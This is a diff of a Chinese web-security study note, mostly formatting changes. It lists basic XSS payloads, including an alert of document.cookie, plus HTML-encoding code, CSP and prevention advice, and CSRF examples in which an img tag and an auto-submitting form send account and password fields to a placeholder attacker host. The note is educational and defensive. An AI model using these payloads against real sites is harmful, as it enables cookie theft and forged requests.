@@ -50,7 +50,7 @@ DOM-based 型 XSS 通过url传入参数去控制触发的，其实也属于反�
 ### 攻击载荷
 
 - `<script>`
-  
+
   ```html
   <script>alert("hack")</script>   #弹出hack
   <script>alert(/hack/)</script>   #弹出hack
@@ -60,36 +60,36 @@ DOM-based 型 XSS 通过url传入参数去控制触发的，其实也属于反�
   ```
 
 - `<svg>`
-  
+
   ```html
-  <svg onload="alert(1)">
-  
+  <svg onload="alert(1)"></svg>
   ```
 
 - `<img>`
-  
+
   ```html
   <img  src=1  οnerrοr=alert("hack")>
   <img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
   ```
 
 - `<body>`
-  
+
   ```html
-  <body οnlοad=alert(1)>
-  <body οnpageshοw=alert(1)>
+  <body οnlοad="alert(1)">
+    <body οnpageshοw="alert(1)"></body>
+  </body>
   ```
 
 - `<video>`
-  
+
   ```html
-  <video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
+  <video οnlοadstart="alert(1)" src="/media/hack-the-planet.mp4" />
   ```
 
 - `<style>`
-  
+
   ```html
-  <style οnlοad=alert(1)></style>
+  <style οnlοad="alert(1)"></style>
   ```
 
 以上 html 标签的 `>` 都可以用 `//` 代替。
@@ -113,14 +113,14 @@ DOM-based 型 XSS 通过url传入参数去控制触发的，其实也属于反�
 编码规则：将 `&` `<` `>` `"` `'` `/` 转义为实体字符（或者十进制、十六进制）。
 
 ```ts
-export function encodeForHTML(str: string){
+export function encodeForHTML(str: string) {
   return str
-    .replace(/&/g,'&amp;')
+    .replace(/&/g, '&amp;')
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;')
     .replace(/'/g, '&#x27;')
     .replace(/"/g, '&#quot;')
-    .replace(/\//g,'&#x2F;')
+    .replace(/\//g, '&#x2F;')
 }
 ```
 
@@ -202,7 +202,7 @@ Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com med
 
 1. 避免内联事件：尽量不要使用 `onLoad="onload('{{data}}')"`、`onClick="go('{{action}}')"` 这种拼接内联事件的写法。在 JavaScript 中通过 `.addEventlistener()` 事件绑定会更安全。
 
-2. 避免拼接 HTML：   前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 `createElement`、`setAttribute` 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。
+2. 避免拼接 HTML： 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 `createElement`、`setAttribute` 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。
 
 3. 时刻保持警惕：在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。
 
@@ -230,17 +230,19 @@ Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com med
 1. 利用 img、svg 登标签构造 get 请求
 
    ```html
-   <img src="http://attacker_website.com" >
+   <img src="http://attacker_website.com" />
    ```
 
 2. 利用表单提交 post请求
 
    ```html
-   <form action="http://atacker_website.com" method='POST'>
-     <input name='account'>
-     <input name='password'>
+   <form action="http://atacker_website.com" method="POST">
+     <input name="account" />
+     <input name="password" />
    </form>
-   <script>document.forms[0].submit()</script>
+   <script>
+     document.forms[0].submit()
+   </script>
    ```
 
 3. 利用 a 标签直接构造链接，但需要受害者点击
